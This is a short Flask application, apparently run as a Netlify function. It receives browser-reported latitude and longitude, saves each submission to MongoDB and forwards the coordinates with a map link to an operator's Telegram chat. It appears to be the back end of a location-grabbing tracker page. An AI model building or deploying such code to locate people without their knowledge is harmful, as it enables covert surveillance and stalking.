import os
from flask import Flask, render_template, request, jsonify
from pymongo import MongoClient
import requests
from serverless_wsgi import handle_request

# Esto busca la carpeta static subiendo dos niveles desde donde está app.py
BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
app = Flask(__name__, static_folder=os.path.join(BASE_DIR, 'static'), template_folder=os.path.join(BASE_DIR, 'templates'))

# Configuración desde variables de entorno (Configúralas en Netlify)
client = MongoClient(os.environ.get('MONGO_URI'))
db = client.guiria_db
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

def enviar_telegram(mensaje):
    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mensaje, "parse_mode": "HTML"}
        requests.post(url, data=payload)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/guardar_ubicacion', methods=['POST'])
def guardar():
    data = request.get_json()
    db.ubicaciones.insert_one(data) # Guardado en MongoDB
    
    lat, lon = data.get('lat'), data.get('lon')
    map_link = f"http://maps.google.com/?q={lat},{lon}"
    mensaje = f"📍 <b>Ubicacion detectada</b>\nLat: {lat}\nLon: {lon}\n🔗 <a href='{map_link}'>Abrir</a>"
    enviar_telegram(mensaje)
    return jsonify({"status": "ok"}), 200

# Handler para Netlify Functions
def handler(event, context):
    return handle_request(app, event, context)